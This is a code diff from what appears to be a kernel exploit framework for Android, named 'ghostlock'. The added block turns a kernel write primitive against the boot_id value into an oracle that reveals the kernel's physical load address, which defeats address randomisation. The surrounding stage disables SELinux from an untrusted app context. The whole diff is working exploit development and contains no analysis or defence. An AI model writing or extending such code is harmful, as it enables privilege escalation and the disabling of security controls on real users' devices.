@@ -412,6 +412,26 @@ namespace ghostlock::session::backend {
         /* Stage: W1 SELinux plus the middleware-specific scratch / resident repair. */
         template <class M>
         StageResult w1(ExploitSession &session) {
+#ifdef GHOSTLOCK_PHYS_PROBE
+            /* phys_load oracle variant: target the boot_id uuid (fixed offset from
+             * _text) instead of selinux_enforcing. The world-readable boot_id is the
+             * hit signal; the winning candidate IS the true kernel phys load. */
+            victim::snapshot_boot_id();
+            support::run_state::enter("w1a");
+            const Status oracle_ok = retry_write_stage<M>(
+                session,
+                "W1: boot_id oracle",
+                session.addresses.data_alias(ghostlock::profile::slide_random_boot_id_data_image()),
+                1, 1,
+                g_exploit_session.profile.w1_settle_us(),
+                victim::verify_bootid_hit, nullptr, 0);
+            if (oracle_ok) {
+                pr_success("phys_load oracle: candidate is EXACT\n");
+                return StageResult::Done;
+            }
+            pr_warning("phys_load oracle: candidate missed\n");
+            return StageResult::Failed;
+#else
             /* W1: disable SELinux before task discovery. untrusted_app may not be able
          * to read enforce while it is still enforcing, so attempt W1 regardless. */
             Status selinux_ok = attack::check_selinux_off();
@@ -449,6 +469,7 @@ namespace ghostlock::session::backend {
                 support::run_state::complete("w1b");
             }
             return StageResult::Continue;
+#endif /* GHOSTLOCK_PHYS_PROBE */
         }
     } // namespace
 
